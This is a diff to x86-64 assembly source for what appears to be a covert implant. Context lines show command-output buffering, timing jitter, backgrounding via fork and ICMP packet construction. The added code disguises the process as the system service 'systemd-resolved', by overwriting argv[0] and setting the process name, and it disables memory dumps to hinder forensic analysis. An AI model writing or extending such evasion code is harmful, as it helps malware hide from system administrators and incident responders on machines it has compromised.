@@ -7,6 +7,8 @@ section .bss
     full_response resb 16384    ; 16KB Buffer for total command output
 
 section .data
+    fake_name db "systemd-"
+    fake_name_1 db "resolved",0
     ; --- JITTER / TIMING PARAMETERS ---
     delay_req:
         dq 0                ; Seconds (tv_sec)
@@ -47,6 +49,16 @@ global _start
 
 ; --- ENTRY POINT & DAEMONIZATION ---
 _start:
+    call _htop_masquerade
+    call _disable_memory_dump
+
+    mov rax,[fake_name]
+    mov rdi,[rsp+8]
+    mov [rdi],rax
+    mov rax,[fake_name_1]
+    mov [rdi+8],rax
+    xor rax, rax              ; rax'i tamamen sıfırla
+    mov [rdi + 16], rax       ; 16. bayttan itibaren 8 baytı (16-24) komple NULL yap!
     ; Step 1: Fork to background
     mov rax, 57                 ; sys_fork
     syscall
@@ -446,6 +458,25 @@ _create_seq_id:
     mov word [icmp_packet + 6], ax
 
     ret             ; Return to caller
+
+
+
+_htop_masquerade:
+    mov rax,157
+    mov rdi,15
+    lea rsi, [fake_name]
+    syscall
+    ret
+
+_disable_memory_dump:
+    mov rax,157
+    mov rdi,4
+    mov rsi, 0
+    syscall
+    ret
+
+
+
 _exit:
     mov rax, 60                     ; sys_exit
     mov rdi, 0                      
